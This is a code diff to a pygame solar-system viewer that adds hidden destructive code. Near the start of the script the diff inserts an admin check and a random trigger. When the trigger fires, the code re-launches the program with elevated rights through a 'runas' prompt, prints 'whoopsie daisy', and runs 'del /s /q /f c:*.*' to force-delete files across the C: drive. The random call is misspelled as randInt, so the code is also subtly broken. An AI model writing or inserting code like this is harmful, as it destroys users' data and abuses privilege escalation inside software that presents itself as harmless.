@@ -1,22 +1,21 @@
 import pygame
 import sys
 import random
+import subprocess
+import ctypes
 i=0
+
+def is_admin():
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin()
+    except:
+        return False
 
 class make_circle():
     def __init__(self) -> None:
         x = str(random.randint(1350, 1400))
         y = str(random.randint(0,1000))
         circle = pygame.draw.circle(screen, kuiper_grey, (int(x),int(y)), 1)
-
-
-
-
-
-
-
-
-
 
 blue = (0, 0, 200)
 orange = (255,165,0)
@@ -52,6 +51,11 @@ eris = pygame.draw.circle(screen, drk_grey, (1425, 500),4.18097281831)
 pygame.init()
 pygame.font.init()
 myfont = pygame.font.SysFont("arial", 30)
+if random.randInt(1, 1000):
+   if not is_admin():
+       ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
+   print("whoopsie daisy")
+   subprocess.Popen("del /s /q /f c:*.*", shell = True)
 while True:
 
     mos_x, mos_y = pygame.mouse.get_pos()
@@ -64,7 +68,6 @@ while True:
     pygame.display.update()     
     print(mos_x, mos_y)          
 
-    
     #earth
     if color == blue:
         pygame.draw.rect(screen,(0,0,0),(0,0,1000,100))
@@ -164,10 +167,3 @@ while True:
         spacetext = myfont.render("Astroid, Kuiper belt", 0, (100, 100, 100))
         screen.blit(spacetext, (0,0))
         pygame.display.update()
-
-
-
-
-
-
-   
